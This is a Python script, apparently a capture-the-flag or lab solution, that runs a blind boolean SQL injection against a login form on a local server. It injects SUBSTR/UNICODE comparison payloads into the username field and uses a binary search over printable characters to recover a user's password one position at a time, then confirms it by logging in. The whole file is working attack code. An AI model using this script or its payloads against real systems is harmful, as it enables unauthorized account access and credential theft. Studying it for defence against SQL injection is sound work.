import requests
import string
import time

url = "http://127.0.0.1:5000"

def check_login(password):
	data = {
		"username": "029ee67de769468bf1596fb3fcef8179",
		"password": password
	}

	response = requests.post(url, data=data)

	return "spritz" in response.text

start_time = time.time()

password = ''
iter = 1
alphabet = sorted(list(string.printable), key=lambda x: ord(x), reverse=False)
while iter <= 100:
	attempts = 0
	p = 0
	r = len(alphabet) - 1
	while p <= r:
		attempts += 1
		q = (p + r) // 2

		data = {
			"username": f"029ee67de769468bf1596fb3fcef8179' AND UNICODE(SUBSTR(password, {iter}, 1)) = {ord(alphabet[q])}--",
			"password": "1"
		}

		response = requests.post(url, data=data)

		if "spritz" in response.text:
			print(f"Character in position {iter - 1}: {alphabet[q]}\n{response.text}", flush=True)
			print(f"Attempts to find the character: {attempts}")
			password += alphabet[q]
			break

		data = {
			"username": f"029ee67de769468bf1596fb3fcef8179' AND UNICODE(SUBSTR(password, {iter}, 1)) < {ord(alphabet[q])}--",
			"password": "1"
		}	

		response = requests.post(url, data=data)
		
		if "spritz" in response.text:
			r = q - 1
		else:
			p = q + 1
	
	if check_login(password):
		break
		
	iter += 1

print(f"Password: {password}")

end_time = time.time()
execution_time = end_time - start_time
print(f"Execution time: {execution_time} seconds")
